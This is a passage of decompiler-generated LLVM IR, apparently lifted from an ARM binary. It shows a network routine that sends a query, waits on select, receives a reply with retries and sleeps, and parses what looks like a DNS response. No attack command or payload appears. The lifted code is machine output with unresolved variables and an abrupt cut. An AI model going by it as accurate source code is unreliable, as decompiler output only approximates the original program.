  store i32 %v1_10f04, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_11010 = call i32 @send(i32 %v0_11000, i32* %v4_11010, i32 %v1_10f04, i32 16384)
  store i32 %v5_11010, i32* %r0.global-to-local, align 4
  %v7_11014 = icmp eq i32 %v5_11010, -1
  store i1 %v7_11014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11014, label %dec_label_pc_1111c, label %dec_label_pc_1101c

dec_label_pc_1101c:                               ; preds = %dec_label_pc_11000
  %v0_1101c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1101c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_11028 = call i32 (i32, i32, ...) @fcntl(i32 3, i32 %v0_1101c)
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_11030 = or i32 %v2_11028, 2048
  store i32 %v1_11030, i32* %r2.global-to-local, align 4
  %v0_11034 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11034, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_1103c = call i32 (i32, i32, ...) @fcntl(i32 4, i32 %v0_11034)
  store i32 %v2_1103c, i32* %r0.global-to-local, align 4
  %v0_11040 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11040, i32* %r3.global-to-local, align 4
  %v2_11044159 = load i32, i32* %r6.global-to-local, align 4
  %v3_11044160 = add i32 %v2_11044159, %v0_11040
  %v4_11044161 = inttoptr i32 %v3_11044160 to i32*
  store i32 %v0_11040, i32* %v4_11044161, align 4
  %v0_11048162 = load i32, i32* %r3.global-to-local, align 4
  %v1_11048163 = add i32 %v0_11048162, 4
  store i32 %v1_11048163, i32* %r3.global-to-local, align 4
  %v7_1104c164 = icmp eq i32 %v1_11048163, 128
  br i1 %v7_1104c164, label %dec_label_pc_11054, label %dec_label_pc_11044.dec_label_pc_11044_crit_edge

dec_label_pc_11044.dec_label_pc_11044_crit_edge:  ; preds = %dec_label_pc_1101c, %dec_label_pc_11044.dec_label_pc_11044_crit_edge
  %v1_11048165 = phi i32 [ %v1_11048, %dec_label_pc_11044.dec_label_pc_11044_crit_edge ], [ %v1_11048163, %dec_label_pc_1101c ]
  %v0_11044.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_11044 = load i32, i32* %r6.global-to-local, align 4
  %v3_11044 = add i32 %v2_11044, %v1_11048165
  %v4_11044 = inttoptr i32 %v3_11044 to i32*
  store i32 %v0_11044.pre, i32* %v4_11044, align 4
  %v0_11048 = load i32, i32* %r3.global-to-local, align 4
  %v1_11048 = add i32 %v0_11048, 4
  store i32 %v1_11048, i32* %r3.global-to-local, align 4
  %v7_1104c = icmp eq i32 %v1_11048, 128
  br i1 %v7_1104c, label %dec_label_pc_11054, label %dec_label_pc_11044.dec_label_pc_11044_crit_edge

dec_label_pc_11054:                               ; preds = %dec_label_pc_11044.dec_label_pc_11044_crit_edge, %dec_label_pc_1101c
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_11054 = load i32, i32* %r7.global-to-local, align 4
  %v3_11054 = udiv i32 %v0_11054, 32
  %v3_1105c = mul nuw nsw i32 %v3_11054, 4
  store i32 %v3_1105c, i32* %r3.global-to-local, align 4
  store i32 %v2_11060, i32* %r2.global-to-local, align 4
  %v2_11064 = add i32 %v3_1105c, %v2_11060
  store i32 %v2_11064, i32* %r5.global-to-local, align 4
  %v1_11068 = add i32 %v2_11064, -156
  %v2_11068 = inttoptr i32 %v1_11068 to i32*
  %v3_11068 = load i32, i32* %v2_11068, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_11070 = urem i32 %v0_11054, 32
  store i32 %v1_11070, i32* %r8.global-to-local, align 4
  %v7_11074 = shl i32 1, %v1_11070
  %v8_11074 = or i32 %v3_11068, %v7_11074
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_11074, i32* %v2_11068, align 4
  %v0_11084 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_11084, i32* %stack_var_-48, align 4
  store i32 %v2_1108c, i32* %lr.global-to-local, align 4
  store i32 %v2_10ee4, i32* %ip.global-to-local, align 4
  %v0_11094 = load i32, i32* %r7.global-to-local, align 4
  %v1_11094 = load i32, i32* %r3.global-to-local, align 4
  %v2_11094 = add i32 %v1_11094, %v0_11094
  store i32 %v2_11094, i32* %r0.global-to-local, align 4
  store i32 %v2_10fbc, i32* %r1.global-to-local, align 4
  %v0_110a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_110a0 = inttoptr i32 %v0_110a0 to %_TYPEDEF_fd_set*
  store i32 %v0_110a0, i32* %r2.global-to-local, align 4
  store i32 %v0_110a0, i32* %r3.global-to-local, align 4
  %v13_110ac = call i32 @select(i32 %v2_11094, %_TYPEDEF_fd_set* %tmp128, %_TYPEDEF_fd_set* %v1_110a0, %_TYPEDEF_fd_set* %v1_110a0, %timeval* %tmp131)
  store i32 %v13_110ac, i32* %r0.global-to-local, align 4
  %v7_110b0 = icmp eq i32 %v13_110ac, -1
  store i1 %v7_110b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110b0, label %dec_label_pc_1112c, label %dec_label_pc_110b8

dec_label_pc_110b8:                               ; preds = %dec_label_pc_11054
  %v2_110b8 = icmp eq i32 %v13_110ac, 0
  store i1 %v2_110b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110b8, label %dec_label_pc_1110c, label %dec_label_pc_110c0

dec_label_pc_110c0:                               ; preds = %dec_label_pc_110b8
  %v0_110c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_110c0 = add i32 %v0_110c0, -156
  %v2_110c0 = inttoptr i32 %v1_110c0 to i32*
  %v3_110c0 = load i32, i32* %v2_110c0, align 4
  %v1_110c4 = load i32, i32* %r8.global-to-local, align 4
  %v6_110c4 = ashr i32 %v3_110c0, %v1_110c4
  store i32 %v6_110c4, i32* %r3.global-to-local, align 4
  %v1_110c8 = urem i32 %v6_110c4, 2
  %v2_110c8 = icmp eq i32 %v1_110c8, 0
  store i1 %v2_110c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110c8, label %dec_label_pc_1112c, label %dec_label_pc_110d0

dec_label_pc_110d0:                               ; preds = %dec_label_pc_110c0
  store i32 %v2_10f84, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_110dc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_110dc, i32* %r0.global-to-local, align 4
  %v0_110e0 = load i32, i32* %r4.global-to-local, align 4
  %v4_110e4 = inttoptr i32 %v0_110e0 to %sockaddr*
  %v9_110e8 = inttoptr i32 %v0_110e0 to i32*
  %v10_110e8 = call i32 @recvfrom(i32 %v0_110dc, i32* %v7_110e8, i32 2048, i32 16384, %sockaddr* %v4_110e4, i32* %v9_110e8)
  store i32 %v10_110e8, i32* %r4.global-to-local, align 4
  %v0_110f0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_110f0, i32* %r0.global-to-local, align 4
  %v1_110f4 = inttoptr i32 %v0_110f0 to i8*
  %v2_110f4 = call i32 @function_1399c(i8* %v1_110f4)
  %v1_110f8 = add i32 %v2_110f4, 17
  store i32 %v1_110f8, i32* %r0.global-to-local, align 4
  %v0_110fc = load i32, i32* %r4.global-to-local, align 4
  %v3_110fc = icmp ult i32 %v0_110fc, %v1_110f8
  %v9_110fc = icmp eq i32 %v0_110fc, %v1_110f8
  store i1 %v9_110fc, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* %r4.global-to-local, align 4
  br i1 %v3_110fc, label %dec_label_pc_1110c, label %dec_label_pc_11160

dec_label_pc_1110c:                               ; preds = %dec_label_pc_110d0, %dec_label_pc_11160, %dec_label_pc_1119c, %dec_label_pc_110b8, %dec_label_pc_11154
  %v0_1110c = load i32, i32* %sl.global-to-local, align 4
  %v7_1110c = icmp eq i32 %v0_1110c, 5
  store i1 %v7_1110c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1110c, label %dec_label_pc_1112c, label %dec_label_pc_11114

dec_label_pc_11114:                               ; preds = %dec_label_pc_1111c, %dec_label_pc_1110c
  %v0_11114 = phi i32 [ %v0_11124, %dec_label_pc_1111c ], [ %v0_1110c, %dec_label_pc_1110c ]
  %v1_11114 = add i32 %v0_11114, 1
  store i32 %v1_11114, i32* %sl.global-to-local, align 4
  %v0_10fc0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10fc0

dec_label_pc_1111c:                               ; preds = %dec_label_pc_11000, %dec_label_pc_10fe8
  %v0_1111c = phi i32 [ %v5_11010, %dec_label_pc_11000 ], [ %v3_10ff4, %dec_label_pc_10fe8 ]
  %v1_1111c = add i32 %v0_1111c, 2
  store i32 %v1_1111c, i32* %r0.global-to-local, align 4
  %v1_11120 = call i32 @sleep(i32 %v1_1111c)
  store i32 %v1_11120, i32* %r0.global-to-local, align 4
  %v0_11124 = load i32, i32* %sl.global-to-local, align 4
  %v7_11124 = icmp eq i32 %v0_11124, 5
  store i1 %v7_11124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11124, label %dec_label_pc_1112c, label %dec_label_pc_11114

dec_label_pc_1112c:                               ; preds = %dec_label_pc_1111c, %dec_label_pc_1110c, %dec_label_pc_110c0, %dec_label_pc_11054, %dec_label_pc_111ac, %dec_label_pc_111b8.backedge
  %v0_1112c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1112c, i32* %r0.global-to-local, align 4
  %v1_11130 = call i32 @close(i32 %v0_1112c)
  store i32 %v1_11130, i32* %r0.global-to-local, align 4
  store i32 %v4_10e64, i32* %r2.global-to-local, align 4
  %v2_11138 = load i8, i8* %tmp126, align 1
  %v3_11138 = zext i8 %v2_11138 to i32
  store i32 %v3_11138, i32* %r4.global-to-local, align 4
  %v2_1113c = icmp eq i8 %v2_11138, 0
  store i1 %v2_1113c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1113c, label %dec_label_pc_11298, label %dec_label_pc_11144

dec_label_pc_11144:                               ; preds = %dec_label_pc_1112c, %dec_label_pc_11298
  %stack_var_-4300.0 = phi i8* [ %v5_112ac, %dec_label_pc_11298 ], [ %tmp126, %dec_label_pc_1112c ]
  %v4_11144 = ptrtoint i8* %stack_var_-4300.0 to i32
  store i32 %v4_11144, i32* %r0.global-to-local, align 4
  %v2_11150 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11150, i32* @r4, align 4
  ret i32 %v4_11144

dec_label_pc_11154:                               ; preds = %bb130
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_11158 = call i32 @sleep(i32 1)
  store i32 %v1_11158, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1110c

dec_label_pc_11160:                               ; preds = %dec_label_pc_110d0
  store i32 %v2_10f84, i32* %lr.global-to-local, align 4
  store i32 %v1_11164, i32* %fp.global-to-local, align 4
  store i32 %v1_11164, i32* %r0.global-to-local, align 4
  %v2_1116c = call i32 @function_1399c(i8* %v1_1116c)
  store i32 %v2_1116c, i32* %r0.global-to-local, align 4
  store i32 %v2_10f84, i32* %ip.global-to-local, align 4
  store i32 %v2_11060, i32* %r1.global-to-local, align 4
  %v4_1117c = load i8, i8* %stack_var_-4288, align 1
  %v5_1117c = sext i8 %v4_1117c to i32
  store i32 %v5_1117c, i32* %r3.global-to-local, align 4
  %v3_11180 = load i8, i8* %v2_11180, align 1
  %v4_11180 = zext i8 %v3_11180 to i32
  store i32 %v4_11180, i32* %r2.global-to-local, align 4
  store i32 %v4_10f38, i32* %lr.global-to-local, align 4
  %v4_11188 = mul nuw nsw i32 %v4_11180, 256
  %v5_11188 = or i32 %v4_11188, %v5_1117c
  store i32 %v5_11188, i32* %r3.global-to-local, align 4
  %v0_1118c = load i32, i32* %fp.global-to-local, align 4
  %v9_11190 = icmp eq i32 %v5_11188, %v4_10f38
  store i1 %v9_11190, i1* %cpsr_z.global-to-local, align 1
  %v2_1118c = add i32 %v2_1116c, 5
  %v1_11194 = add i32 %v2_1118c, %v0_1118c
  store i32 %v1_11194, i32* %r0.global-to-local, align 4
  br i1 %v9_11190, label %dec_label_pc_1119c, label %dec_label_pc_1110c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_11160
  %v3_1119c = load i8, i8* %v2_1119c, align 1
  %v4_1119c = zext i8 %v3_1119c to i32
  store i32 %v4_1119c, i32* %r2.global-to-local, align 4
  %v3_111a0 = load i8, i8* %v2_111a0, align 1
  %v4_111a0 = zext i8 %v3_111a0 to i32
  store i32 %v4_111a0, i32* %r3.global-to-local, align 4
  %v4_111a4 = mul nuw nsw i32 %v4_111a0, 256
  %v5_111a4 = or i32 %v4_111a4, %v4_1119c
  store i32 %v5_111a4, i32* %r2.global-to-local, align 4
  %v7_111a4 = icmp eq i32 %v5_111a4, 0
  store i1 %v7_111a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111a4, label %dec_label_pc_1110c, label %dec_label_pc_111ac

dec_label_pc_111ac:                               ; preds = %dec_label_pc_1119c
  %v3_111b0 = mul nuw nsw i32 %v4_1119c, 256
  %v5_111b4 = or i32 %v4_111a0, %v3_111b0
  %v1_1126c = add i32 %v2_10f84, -49152
  %v1_111b8148 = add nsw i32 %v5_111b4, -1
  %v3_111bc149 = mul i32 %v1_111b8148, 65536
  store i32 %v3_111bc149, i32* %r3.global-to-local, align 4
  %v7_111c0155 = icmp eq i32 %v3_111bc149, -65536
  store i1 %v7_111c0155, i1* %cpsr_z.global-to-local, align 1
  %v3_111c4156 = urem i32 %v1_111b8148, 65536
  store i32 %v3_111c4156, i32* %r6.global-to-local, align 4
  br i1 %v7_111c0155, label %dec_label_pc_1112c, label %dec_label_pc_111cc.lr.ph

dec_label_pc_111cc.lr.ph:                         ; preds = %dec_label_pc_111ac
  %v1_11348 = add i32 %v4_10e64, 4
  %v2_11348 = inttoptr i32 %v1_11348 to i32*
  br label %dec_label_pc_111cc

dec_label_pc_111cc:                               ; preds = %dec_label_pc_111cc.lr.ph, %dec_label_pc_111b8.backedge
  %v3_111c4158 = phi i32 [ %v3_111c4156, %dec_label_pc_111cc.lr.ph ], [ %v3_111c4, %dec_label_pc_111b8.backedge ]
  %v0_11220157 = phi i32 [ %v1_11194, %dec_label_pc_111cc.lr.ph ], [ %storemerge, %dec_label_pc_111b8.backedge ]
  store i32 %v0_11220157, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_111d818 = inttoptr i32 %v0_11220157 to i8*
  %v2_111d819 = load i8, i8* %v1_111d818, align 1
  %v3_111d820 = zext i8 %v2_111d819 to i32
  store i32 %v3_111d820, i32* %r2.global-to-local, align 4
  %v2_111dc21 = icmp eq i8 %v2_111d819, 0
  store i1 %v2_111dc21, i1* %cpsr_z.global-to-local, align 1
  %v3_111e022 = mul nuw nsw i32 %v3_111d820, 256
  store i32 %v3_111e022, i32* %r1.global-to-local, align 4
  br i1 %v2_111dc21, label %dec_label_pc_11218, label %dec_label_pc_111e8.preheader

dec_label_pc_111e8.preheader:                     ; preds = %dec_label_pc_111cc, %dec_label_pc_111d8.backedge
  %v1_112bc = phi i32 [ %v1_112bc50, %dec_label_pc_111d8.backedge ], [ 1, %dec_label_pc_111cc ]
  %v0_112b448 = phi i32 [ %v0_112b4, %dec_label_pc_111d8.backedge ], [ 0, %dec_label_pc_111cc ]
  %v0_111f446 = phi i32 [ %v3_111e0, %dec_label_pc_111d8.backedge ], [ %v3_111e022, %dec_label_pc_111cc ]
  %v0_111f044 = phi i32 [ %v1_112b8, %dec_label_pc_111d8.backedge ], [ %v0_11220157, %dec_label_pc_111cc ]
  %v0_111e842 = phi i32 [ %v3_111d8, %dec_label_pc_111d8.backedge ], [ %v3_111d820, %dec_label_pc_111cc ]
  br label %dec_label_pc_111e8

dec_label_pc_111e8:                               ; preds = %dec_label_pc_111e8.preheader, %dec_label_pc_111f0
  %v0_112b4 = phi i32 [ %v0_112b448, %dec_label_pc_111e8.preheader ], [ 1, %dec_label_pc_111f0 ]
  %v0_111f4 = phi i32 [ %v0_111f446, %dec_label_pc_111e8.preheader ], [ %v3_11210, %dec_label_pc_111f0 ]
  %v0_112b8 = phi i32 [ %v0_111f044, %dec_label_pc_111e8.preheader ], [ %v2_11200, %dec_label_pc_111f0 ]
  %v0_111e8 = phi i32 [ %v0_111e842, %dec_label_pc_111e8.preheader ], [ %v3_11204, %dec_label_pc_111f0 ]
  %v7_111e8 = icmp eq i32 %v0_111e8, 191
  store i1 %v7_111e8, i1* %cpsr_z.global-to-local, align 1
  %tmp185 = icmp ult i32 %v0_111e8, 192
  br i1 %tmp185, label %dec_label_pc_112b4, label %dec_label_pc_111f0

dec_label_pc_111f0:                               ; preds = %dec_label_pc_111e8
  %v1_111f0 = add i32 %v0_112b8, 1
  %v2_111f0 = inttoptr i32 %v1_111f0 to i8*
  %v3_111f0 = load i8, i8* %v2_111f0, align 1
  %v4_111f0 = zext i8 %v3_111f0 to i32
  store i32 %v2_10f84, i32* %r1.global-to-local, align 4
  %v2_111f4 = add i32 %v0_111f4, %v1_1126c
  %v2_11200 = add i32 %v2_111f4, %v4_111f0
  store i32 %v2_11200, i32* %r3.global-to-local, align 4
  %v1_11204 = inttoptr i32 %v2_11200 to i8*
  %v2_11204 = load i8, i8* %v1_11204, align 1
  %v3_11204 = zext i8 %v2_11204 to i32
  store i32 %v3_11204, i32* %r2.global-to-local, align 4
  %v2_11208 = icmp eq i8 %v2_11204, 0
  store i1 %v2_11208, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %lr.global-to-local, align 4
  %v3_11210 = mul nuw nsw i32 %v3_11204, 256
  store i32 %v3_11210, i32* %r1.global-to-local, align 4
  br i1 %v2_11208, label %dec_label_pc_11218, label %dec_label_pc_111e8

dec_label_pc_11218:                               ; preds = %dec_label_pc_111d8.backedge, %dec_label_pc_111f0, %dec_label_pc_111cc
  %v1_1121c = phi i32 [ 1, %dec_label_pc_111cc ], [ %v1_112bc, %dec_label_pc_111f0 ], [ %v1_112bc50, %dec_label_pc_111d8.backedge ]
  %v0_11218 = phi i32 [ 0, %dec_label_pc_111cc ], [ 1, %dec_label_pc_111f0 ], [ %v0_112b4, %dec_label_pc_111d8.backedge ]
  %v7_11218 = icmp eq i32 %v0_11218, 1
  store i1 %v7_11218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11218, label %bb132, label %bb133

bb132:                                            ; preds = %dec_label_pc_11218
  %v2_1121c = add i32 %v1_1121c, 1
  store i32 %v2_1121c, i32* %ip.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %dec_label_pc_11218, %bb132
  %v1_11220 = phi i32 [ %v1_1121c, %dec_label_pc_11218 ], [ %v2_1121c, %bb132 ]
  %v2_11220 = add i32 %v1_11220, %v0_11220157
  store i32 %v2_11220, i32* %r4.global-to-local, align 4
  %v3_11224 = inttoptr i32 %v2_11220 to i8*
  %v4_11224 = load i8, i8* %v3_11224, align 1
  %v6_11224 = zext i8 %v4_11224 to i32
  store i32 %v6_11224, i32* %r3.global-to-local, align 4
  %v1_11228 = add i32 %v2_11220, 1
  %v2_11228 = inttoptr i32 %v1_11228 to i8*
  %v3_11228 = load i8, i8* %v2_11228, align 1
  %v4_11228 = zext i8 %v3_11228 to i32
  store i32 %v4_11228, i32* %r2.global-to-local, align 4
  %v4_1122c = mul nuw nsw i32 %v4_11228, 256
  %v5_1122c = or i32 %v4_1122c, %v6_11224
  store i32 %v5_1122c, i32* %r3.global-to-local, align 4
  %v7_11230 = icmp eq i32 %v5_1122c, 256
  store i1 %v7_11230, i1* %cpsr_z.global-to-local, align 1
  %v1_11234 = add i32 %v2_11220, 10
  store i32 %v1_11234, i32* %r5.global-to-local, align 4
  br i1 %v7_11230, label %dec_label_pc_112d4, label %dec_label_pc_1123c

dec_label_pc_1123c:                               ; preds = %dec_label_pc_112d4, %bb133
  store i32 %v1_11234, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1124824 = inttoptr i32 %v1_11234 to i8*
  %v2_1124825 = load i8, i8* %v1_1124824, align 1
  %v3_1124826 = zext i8 %v2_1124825 to i32
  store i32 %v3_1124826, i32* %r2.global-to-local, align 4
  %v2_1124c27 = icmp eq i8 %v2_1124825, 0
  store i1 %v2_1124c27, i1* %cpsr_z.global-to-local, align 1
  %v3_1125028 = mul nuw nsw i32 %v3_1124826, 256
  store i32 %v3_1125028, i32* %r1.global-to-local, align 4
  br i1 %v2_1124c27, label %dec_label_pc_11288, label %dec_label_pc_11258.preheader

dec_label_pc_11258.preheader:                     ; preds = %dec_label_pc_1123c, %dec_label_pc_11248.backedge
  %v1_112cc = phi i32 [ %v1_112cc65, %dec_label_pc_11248.backedge ], [ 1, %dec_label_pc_1123c ]
  %v0_112c463 = phi i32 [ %v0_112c4, %dec_label_pc_11248.backedge ], [ 0, %dec_label_pc_1123c ]
  %v0_1126461 = phi i32 [ %v3_11250, %dec_label_pc_11248.backedge ], [ %v3_1125028, %dec_label_pc_1123c ]
  %v0_1126059 = phi i32 [ %v1_112c8, %dec_label_pc_11248.backedge ], [ %v1_11234, %dec_label_pc_1123c ]
  %v0_1125857 = phi i32 [ %v3_11248, %dec_label_pc_11248.backedge ], [ %v3_1124826, %dec_label_pc_1123c ]
  br label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %dec_label_pc_11258.preheader, %dec_label_pc_11260
  %v0_112c4 = phi i32 [ %v0_112c463, %dec_label_pc_11258.preheader ], [ 1, %dec_label_pc_11260 ]
  %v0_11264 = phi i32 [ %v0_1126461, %dec_label_pc_11258.preheader ], [ %v3_11280, %dec_label_pc_11260 ]
  %v0_112c8 = phi i32 [ %v0_1126059, %dec_label_pc_11258.preheader ], [ %v2_11270, %dec_label_pc_11260 ]
  %v0_11258 = phi i32 [ %v0_1125857, %dec_label_pc_11258.preheader ], [ %v3_11274, %dec_label_pc_11260 ]
  %v7_11258 = icmp eq i32 %v0_11258, 191
  store i1 %v7_11258, i1* %cpsr_z.global-to-local, align 1
  %tmp186 = icmp ult i32 %v0_11258, 192
  br i1 %tmp186, label %dec_label_pc_112c4, label %dec_label_pc_11260

dec_label_pc_11260:                               ; preds = %dec_label_pc_11258
  %v1_11260 = add i32 %v0_112c8, 1
  %v2_11260 = inttoptr i32 %v1_11260 to i8*
  %v3_11260 = load i8, i8* %v2_11260, align 1
  %v4_11260 = zext i8 %v3_11260 to i32
  store i32 %v2_10f84, i32* %r1.global-to-local, align 4
  %v2_11264 = add i32 %v0_11264, %v1_1126c
  %v2_11270 = add i32 %v2_11264, %v4_11260
  store i32 %v2_11270, i32* %r3.global-to-local, align 4
  %v1_11274 = inttoptr i32 %v2_11270 to i8*
  %v2_11274 = load i8, i8* %v1_11274, align 1
  %v3_11274 = zext i8 %v2_11274 to i32
  store i32 %v3_11274, i32* %r2.global-to-local, align 4
  %v2_11278 = icmp eq i8 %v2_11274, 0
  store i1 %v2_11278, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_11280 = mul nuw nsw i32 %v3_11274, 256
  store i32 %v3_11280, i32* %r1.global-to-local, align 4
  br i1 %v2_11278, label %dec_label_pc_11288, label %dec_label_pc_11258

dec_label_pc_11288:                               ; preds = %dec_label_pc_11248.backedge, %dec_label_pc_11260, %dec_label_pc_1123c
  %v1_1128c = phi i32 [ 1, %dec_label_pc_1123c ], [ %v1_112cc, %dec_label_pc_11260 ], [ %v1_112cc65, %dec_label_pc_11248.backedge ]
  %v0_11288 = phi i32 [ 0, %dec_label_pc_1123c ], [ 1, %dec_label_pc_11260 ], [ %v0_112c4, %dec_label_pc_11248.backedge ]
  %v7_11288 = icmp eq i32 %v0_11288, 1
  store i1 %v7_11288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11288, label %bb134, label %bb135

bb134:                                            ; preds = %dec_label_pc_11288
  %v2_1128c = add i32 %v1_1128c, 1
  store i32 %v2_1128c, i32* %r0.global-to-local, align 4
  br label %bb135

bb135:                                            ; preds = %dec_label_pc_11288, %bb134
  %v1_11290 = phi i32 [ %v1_1128c, %dec_label_pc_11288 ], [ %v2_1128c, %bb134 ]
  %v2_11290 = add i32 %v1_11290, %v1_11234
  br label %dec_label_pc_111b8.backedge

dec_label_pc_111b8.backedge:                      ; preds = %bb135, %dec_label_pc_1137c
  %v0_111b8.pre = phi i32 [ %v3_111c4158, %bb135 ], [ %v0_111b8.pre.pre, %dec_label_pc_1137c ]
  %storemerge = phi i32 [ %v2_11290, %bb135 ], [ %v2_11390, %dec_label_pc_1137c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_111b8 = add i32 %v0_111b8.pre, -1
  %v3_111bc = mul i32 %v1_111b8, 65536
  store i32 %v3_111bc, i32* %r3.global-to-local, align 4
  %v7_111c0 = icmp eq i32 %v3_111bc, -65536
  store i1 %v7_111c0, i1* %cpsr_z.global-to-local, align 1
  %v3_111c4 = urem i32 %v1_111b8, 65536
  store i32 %v3_111c4, i32* %r6.global-to-local, align 4
  br i1 %v7_111c0, label %dec_label_pc_1112c, label %dec_label_pc_111cc

dec_label_pc_11298:                               ; preds = %dec_label_pc_1112c
  %v1_11298 = add i32 %v4_10e64, 4
  %v2_11298 = inttoptr i32 %v1_11298 to i32*
  %v3_11298 = load i32, i32* %v2_11298, align 4
  store i32 %v3_11298, i32* %r0.global-to-local, align 4
  %v2_1129c = icmp eq i32 %v3_11298, 0
  store i1 %v2_1129c, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_112a4.235 to i32), i32* %lr.global-to-local, align 4
  %v1_112a0 = xor i1 %v2_1129c, true
  call void @__pseudo_cond_branch(i1 %v1_112a0, i32 ptrtoint (i32* @global_var_8de4.113 to i32))
  store i32 %v4_10e64, i32* %r0.global-to-local, align 4
  call void @free(i32* nonnull %v2_10e64)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  %v0_112ac = load i32, i32* %r4.global-to-local, align 4
  %v5_112ac = inttoptr i32 %v0_112ac to i8*
  br label %dec_label_pc_11144

dec_label_pc_112b4:                               ; preds = %dec_label_pc_111e8
  %v2_112b4 = icmp eq i32 %v0_112b4, 0
  store i1 %v2_112b4, i1* %cpsr_z.global-to-local, align 1
  %v1_112b8 = add i32 %v0_112b8, 1
  store i32 %v1_112b8, i32* %r3.global-to-local, align 4
  br i1 %v2_112b4, label %bb136, label %dec_label_pc_111d8.backedge

dec_label_pc_111d8.backedge:                      ; preds = %dec_label_pc_112b4, %bb136
  %v1_112bc50 = phi i32 [ %v1_112bc, %dec_label_pc_112b4 ], [ %v2_112bc, %bb136 ]
  %v1_111d8 = inttoptr i32 %v1_112b8 to i8*
  %v2_111d8 = load i8, i8* %v1_111d8, align 1
  %v3_111d8 = zext i8 %v2_111d8 to i32
  store i32 %v3_111d8, i32* %r2.global-to-local, align 4
  %v2_111dc = icmp eq i8 %v2_111d8, 0
  store i1 %v2_111dc, i1* %cpsr_z.global-to-local, align 1
  %v3_111e0 = mul nuw nsw i32 %v3_111d8, 256
  store i32 %v3_111e0, i32* %r1.global-to-local, align 4
  br i1 %v2_111dc, label %dec_label_pc_11218, label %dec_label_pc_111e8.preheader

bb136:                                            ; preds = %dec_label_pc_112b4
  %v2_112bc = add i32 %v1_112bc, 1
  store i32 %v2_112bc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_111d8.backedge

dec_label_pc_112c4:                               ; preds = %dec_label_pc_11258
  %v2_112c4 = icmp eq i32 %v0_112c4, 0
  store i1 %v2_112c4, i1* %cpsr_z.global-to-local, align 1
  %v1_112c8 = add i32 %v0_112c8, 1
  store i32 %v1_112c8, i32* %r3.global-to-local, align 4
  br i1 %v2_112c4, label %bb137, label %dec_label_pc_11248.backedge

dec_label_pc_11248.backedge:                      ; preds = %dec_label_pc_112c4, %bb137
  %v1_112cc65 = phi i32 [ %v1_112cc, %dec_label_pc_112c4 ], [ %v2_112cc, %bb137 ]
  %v1_11248 = inttoptr i32 %v1_112c8 to i8*
  %v2_11248 = load i8, i8* %v1_11248, align 1
  %v3_11248 = zext i8 %v2_11248 to i32
  store i32 %v3_11248, i32* %r2.global-to-local, align 4
  %v2_1124c = icmp eq i8 %v2_11248, 0
  store i1 %v2_1124c, i1* %cpsr_z.global-to-local, align 1
  %v3_11250 = mul nuw nsw i32 %v3_11248, 256
  store i32 %v3_11250, i32* %r1.global-to-local, align 4
  br i1 %v2_1124c, label %dec_label_pc_11288, label %dec_label_pc_11258.preheader

bb137:                                            ; preds = %dec_label_pc_112c4
  %v2_112cc = add i32 %v1_112cc, 1
  store i32 %v2_112cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11248.backedge

dec_label_pc_112d4:                               ; preds = %bb133
  %v1_112d4 = add i32 %v2_11220, 2
  %v2_112d4 = inttoptr i32 %v1_112d4 to i8*
  %v3_112d4 = load i8, i8* %v2_112d4, align 1
  %v4_112d4 = zext i8 %v3_112d4 to i32
  store i32 %v4_112d4, i32* %r3.global-to-local, align 4
  %v1_112d8 = add i32 %v2_11220, 3
  %v2_112d8 = inttoptr i32 %v1_112d8 to i8*
  %v3_112d8 = load i8, i8* %v2_112d8, align 1
  %v4_112d8 = zext i8 %v3_112d8 to i32
  store i32 %v4_112d8, i32* %r2.global-to-local, align 4
  %v4_112dc = mul nuw nsw i32 %v4_112d8, 256
